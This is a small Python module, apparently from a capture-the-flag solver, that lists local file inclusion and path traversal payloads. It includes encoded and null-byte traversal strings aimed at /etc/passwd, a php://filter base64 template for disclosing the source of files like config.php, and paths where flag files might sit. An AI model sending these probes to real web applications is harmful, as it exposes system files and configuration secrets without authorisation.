"""Local file inclusion / path traversal probes and read-only flag paths."""
from __future__ import annotations

# Canary target used to *confirm* traversal: /etc/passwd has a stable root line.
PASSWD_PROBES = [
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
    "/etc/passwd",
    "../../../../etc/passwd%00",
]

# php://filter base64 source disclosure (PHP challenges). {target} is a file.
PHP_FILTER = "php://filter/convert.base64-encode/resource={target}"

PHP_SOURCE_TARGETS = ("index.php", "config.php", "flag.php", "../flag.php")

# Read-only flag locations tried once traversal is confirmed.
FLAG_PATHS = [
    "../../../../flag", "../../../../flag.txt",
    "../../../../app/flag", "../../../../app/flag.txt",
    "../../../../../flag.txt", "/flag", "/flag.txt",
    "../flag", "../flag.txt", "flag", "flag.txt",
]
